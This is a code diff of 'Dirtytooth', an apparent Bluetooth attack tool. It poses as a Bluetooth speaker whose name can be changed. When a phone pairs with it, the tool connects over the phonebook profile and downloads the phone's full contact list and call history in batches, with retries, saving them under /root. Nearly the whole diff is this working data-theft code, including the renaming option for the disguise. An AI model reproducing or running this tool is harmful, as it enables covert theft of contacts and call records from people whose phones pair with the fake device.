@@ -2,27 +2,63 @@
 # -*- coding: utf-8 -*-
 
 import os
+import re
 import sys
 import time
-import psutil
+import shutil
 import logging
 import argparse
 import datetime
-import bluetooth
 import subprocess
+from xml.dom import minidom
+from xml.etree import ElementTree
+
+import psutil
+import bluetooth
 from nOBEX import client, headers, responses
 
+LOG_PATH = '/var/log/dirtytooth'
+FILES_PATH = '/root/dirtytooth'
 START_PATH = '/usr/lib/dirtytooth/start'
-FILES_PATH = '/root/dirtytooth/'
-LOG_PATH = '/var/log/bluetooth_dev'
+
+CONTACT_BLOCK_SIZE = 5
 
 parser = argparse.ArgumentParser(description='Dirtytooth package',
                                  epilog="Enjoy with dirtytooth!")
 group = parser.add_mutually_exclusive_group(required=True)
 group.add_argument('--start', action='store_true', help='Start agent discover')
 group.add_argument('--stop', action='store_true', help='Stop agent discover')
-group.add_argument('--mac', help='MAC device to get dirtytooth! }:)')
+group.add_argument('--restart', action='store_true', help='Restart agent discover')
+group.add_argument('-n', '--name', help='Change the name of the bluetooth speaker')
+group.add_argument('-m', '--mac', help='MAC device to get dirtytooth! }:)')
 args = parser.parse_args()
+
+
+def start():
+    if get_pid():
+        print('dirtyagent process is already open!')
+        logging.info("dirtyagent process is already open!")
+    else:
+        subprocess.call([START_PATH], shell=True)
+        logging.info("dirtyagent process started")
+
+
+def stop():
+    pid = get_pid()
+    if pid:
+        p = psutil.Process(pid)
+        p.terminate()
+        logging.info("Stop dirtyagent")
+    else:
+        print('dirtyagent process doesn´t exist')
+        logging.info("Try to stop process, but it´s doesn´t exist")
+
+
+def restart():
+    stop()
+    time.sleep(1)
+    start()
+    logging.info("Dirtytooth restarted")
 
 
 def get_pid():
@@ -32,14 +68,27 @@ def get_pid():
     return None
 
 
-def write_file(filename, file):
-    with open(FILES_PATH + filename, "w") as f:
-        f.write(file)
+def write_file(filename, card):
+    with open(filename, "w") as f:
+        f.write(card)
 
 
-def get_name(addr):
-    return subprocess.check_output(["/usr/lib/dirtytooth/device",
-                                    "name", addr], shell=False)
+def dump_xml(element, file_name):
+    fd = open(file_name, 'w')
+    fd.write('<?xml version="1.0"?>\n<!DOCTYPE vcard-listing SYSTEM "vcard-listing.dtd">\n')
+    rough_string = ElementTree.tostring(element, 'utf-8')
+    reparsed = minidom.parseString(rough_string)
+    pretty_string = reparsed.toprettyxml().encode('utf-8')
+    fd.write(pretty_string[23:])  # skip xml declaration
+    fd.close()
+
+
+def escape_ampersands(s):
+    # Terrible hack to work around Python getting mad at things like
+    # <foo goo="Moo & Roo" />
+    us = str(s, encoding='utf-8')
+    us2 = '&amp;'.join(us.split('&'))
+    return bytes(us2, encoding='utf-8')
 
 
 def connect(device_address):
@@ -62,56 +111,152 @@ def connect(device_address):
     return c
 
 
-def get_file(c, src_path, filename, book=True):
+def dump_dir(c, src_path, dest_path):
+    src_path = src_path.strip("/")
+
+    # since some people may still be holding back progress with Python 2, I'll support
+    # them for now and not use the Python 3 exists_ok option :(
+    try:
+        os.makedirs(dest_path)
+    except OSError as e:
+        logging.exception(e)
+        pass
+
+    # Access the list of vcards in the directory
+    hdrs, cards = c.get(src_path, header_list=[headers.Type(b'x-bt/vcard-listing')])
+
+    # Parse the XML response to the previous request.
+    # Extract a list of file names in the directory
+    names = []
+    try:
+        root = ElementTree.fromstring(cards)
+    except ElementTree.ParseError:
+        root = ElementTree.fromstring(escape_ampersands(cards))
+    dump_xml(root, "/".join([dest_path, "listing.xml"]))
+    for card in root.findall("card"):
+        names.append(card.attrib["handle"])
+
+    logging.info("The number files on {} is {}".format(dest_path, len(names)))
+
+    c.setpath(src_path)
+
+    # return to the root directory
+    depth = len([f for f in src_path.split("/") if len(f)])
+    for i in range(depth):
+        c.setpath(to_parent=True)
+
+    return names
+
+
+def get_file(c, src_path, dest_path, folder_name=None, book=True):
     if book:
         mimetype = b'x-bt/phonebook'
     else:
         mimetype = b'x-bt/vcard'
 
-    hdrs, file = c.get(src_path, header_list=[headers.Type(mimetype)])
-    write_file(filename, file)
-    logging.info('%s save!' % filename)
+    try:
+        hdrs, card = c.get(src_path, header_list=[headers.Type(mimetype)])
+        write_file(dest_path, card)
+        logging.info('%s save!' % dest_path)
+        return card
+    except Exception as e:
+        logging.exception('Exception in get data!: %s' % e)
+        return False
+
+
+def get_data(c, src_path, dest_path, data_list, min_list, max_list):
+    c.setpath(src_path)
+    for n in data_list[min_list:max_list]:
+        filename = "/".join([dest_path, n])
+        get_file(c, n, filename, folder_name=src_path, book=False)
+
+    depth = len([f for f in src_path.split("/") if len(f)])
+    for x in range(depth):
+        c.setpath(to_parent=True)
 
 
 def main():
-    logging.basicConfig(format='%(levelname)s:%(message)s',
+    logging.basicConfig(format='%(asctime)s - %(levelname)s:%(message)s',
+                        datefmt='%d/%m/%Y %I:%M:%S %p',
                         filename=LOG_PATH,
                         level=logging.DEBUG)
+    logging.info("DirtyTooth script started")
 
     if args.start:
-        if get_pid():
-            print('Process dirtyagent is already open!')
-        else:
-            subprocess.call([START_PATH], shell=True)
+        start()
     elif args.stop:
-        pid = get_pid()
-        if pid:
-            p = psutil.Process(pid)
-            p.terminate()
-        else:
-            print('Process dirtyagent doesn´t exist')
+        stop()
+    elif args.restart:
+        restart()
+    elif args.name:
+        with open(START_PATH, 'r') as in_file:
+            text = in_file.read()
+
+        replace = re.sub(r'name "(.*?)"', 'name "%s"' % args.name, text)
+
+        with open('/usr/lib/dirtytooth/start_', 'w') as out_file:
+            out_file.write(replace)
+
+        os.chmod('/usr/lib/dirtytooth/start_', 0o755)
+        shutil.move('/usr/lib/dirtytooth/start_', START_PATH)
+        restart()
+        logging.info("Dirtytooth name changed: {}".format(args.name))
     else:
         if get_pid():
-            print('Dirtytooth: Getting device info: %s' % args.mac)
+            print('Getting device info: {}'.format(args.mac))
+            logging.info('Getting device info: {}'.format(args.mac))
 
-            device_address = args.mac
-
-            c = connect(device_address)
+            mac_add = args.mac
 
             if not os.path.isdir(FILES_PATH):
                 os.mkdir(FILES_PATH)
 
             date = datetime.datetime.fromtimestamp(time.time()).strftime('%Y%m%d%H%M%S')
 
-            get_file(c, "telecom/pb.vcf",
-                     "%s-UTC_%s_phonebook" % (date, device_address))
-            get_file(c, "telecom/cch.vcf",
-                     "%s-UTC_%s_history" % (date, device_address))
+            tries = 0
+            while tries < 5:
+                logging.info('Try %s connect device...' % tries)
+                try:
+                    c = connect(mac_add)
+                    logging.info("Dirtytooth connect with device %s" % mac_add)
 
-            c.disconnect()
+                    src_path_pb = "telecom/pb"
+                    src_path_cch = "telecom/cch"
+
+                    dest_path_pb = "{}/{}-UTC_{}_telecom/pb".format(FILES_PATH, date, mac_add)
+                    dest_path_cch = "{}/{}-UTC_{}_telecom/cch".format(FILES_PATH, date, mac_add)
+
+                    list_pb = dump_dir(c, src_path_pb, dest_path_pb)
+                    list_cch = dump_dir(c, src_path_cch, dest_path_cch)
+
+                    logging.info('Try getting contacts data...')
+
+                    i = 0
+                    j = CONTACT_BLOCK_SIZE
+
+                    while j <= max(len(list_pb), len(list_cch)) + CONTACT_BLOCK_SIZE:
+                        get_data(c, src_path_pb.strip("/"), dest_path_pb,
+                                 list_pb, i, j)
+                        get_data(c, src_path_cch.strip("/"), dest_path_cch,
+                                 list_cch, i, j)
+
+                        i = i + CONTACT_BLOCK_SIZE
+                        j = j + CONTACT_BLOCK_SIZE
+
+                    c.disconnect()
+                    return 1
+
+                except Exception as e:
+                    tries = tries + 1
+                    c.disconnect()
+                    logging.exception('Exception in main: %s' % e)
+
+            logging.error("dirtytooth failed!")
             return 0
         else:
             print('Process dirtyagent doesn´t exist')
+            logging.warning("Process dirtyagent doesn´t exist")
+            return 1
 
 
 if __name__ == "__main__":
